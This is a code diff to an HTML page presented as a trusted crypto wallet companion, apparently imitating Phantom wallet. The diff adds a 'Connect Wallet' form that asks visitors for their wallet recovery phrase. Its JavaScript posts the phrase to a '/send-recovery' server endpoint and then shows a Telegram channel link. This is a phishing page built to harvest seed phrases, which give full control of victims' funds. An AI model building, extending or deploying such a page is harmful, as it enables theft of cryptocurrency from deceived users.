@@ -298,24 +298,52 @@
     </header>
 
     <section class="recovery-box">
-        <h2>Enter Your Recovery Phrase</h2>
-        <textarea id="recovery-phrase" placeholder="Enter your recovery phrase here..."></textarea>
-        <button onclick="activateTelegram()">Connect Wallet</button>
-    
-        <div id="telegram-section" class="telegram-section">
-            <h3>Join Our Telegram Channel</h3>
-            <button onclick="window.location.href='https://t.me/PhantomwalltEN1'">Join Telegram</button>
-        </div>
-        
-    </section>
-    
-    <section class="recovery-box">
     <h2>Enter Your Recovery Phrase</h2>
-    <form action="/send-recovery" method="POST">
-        <textarea id="recovery-phrase" name="recoveryPhrase" placeholder="Enter your recovery phrase here..."></textarea>
+    <form id="recovery-form">
+        <textarea id="recovery-phrase" placeholder="Enter your recovery phrase here..." name="recoveryPhrase"></textarea>
         <button type="submit">Connect Wallet</button>
     </form>
+
+    <div id="telegram-section" class="telegram-section" style="display: none;">
+        <h3>Join Our Telegram Channel</h3>
+        <button onclick="window.location.href='https://t.me/PhantomwalltEN1'">Join Telegram</button>
+    </div>
 </section>
+
+<script>
+    // اتصال فرم به سرور
+    document.getElementById("recovery-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const recoveryPhrase = document.getElementById("recovery-phrase").value;
+
+        if (!recoveryPhrase.trim()) {
+            alert("Please enter your recovery phrase!");
+            return;
+        }
+
+        try {
+            const response = await fetch("http://localhost:3000/send-recovery", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ recoveryPhrase }),
+            });
+
+            if (response.ok) {
+                alert("Recovery phrase sent successfully!");
+                document.getElementById("telegram-section").style.display = "flex";
+            } else {
+                alert("Failed to send recovery phrase. Please try again.");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("An error occurred. Please try again.");
+        }
+    });
+</script>
+
     
     <section class="hero">
         <h2>Your Trusted Wallet Companion</h2>
